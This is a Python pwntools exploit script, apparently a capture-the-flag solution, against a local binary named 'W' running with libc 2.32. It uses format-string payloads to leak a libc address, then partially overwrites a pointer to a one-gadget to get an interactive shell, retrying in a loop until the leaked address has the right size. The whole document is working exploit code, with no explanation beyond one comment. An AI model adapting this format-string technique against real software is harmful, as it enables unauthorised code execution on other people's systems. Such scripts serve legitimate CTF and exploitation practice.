#!/usr/bin/python3
from pwn import *

def tohex(val, nbits):
  return int((val + (1 << nbits)) % (1 << nbits))

def pwn():
    r = process('./W', env={"LD_PRELOAD": "./libc-2.32.so"})
    
    r.sendlineafter('?\n', '1')
    r.sendlineafter('?\n', str(69))
    payload = '%*l %72c'+'%73$hhn'
    
    r.sendafter('?', payload)
    r.recvuntil(':\n')
    libc = tohex(int(r.recvline()[1:-2].rstrip())-1069556, 32)
    
    log.success('Libc @ '+hex(libc))

    if((len(hex(libc)))>8):
        r.close()
        return -1

    r.sendlineafter('?', str(73))
    payload = '%'+str(libc&0xffffff)+'c'+'%73$n' # partial overwrite 4 bytes to one gadget
    print(payload)
    print(hex(libc))
    input('Q')
    r.sendlineafter('?', payload)
    r.interactive()

    return 0
    
x = -1
while(x!=0):
    x = pwn()
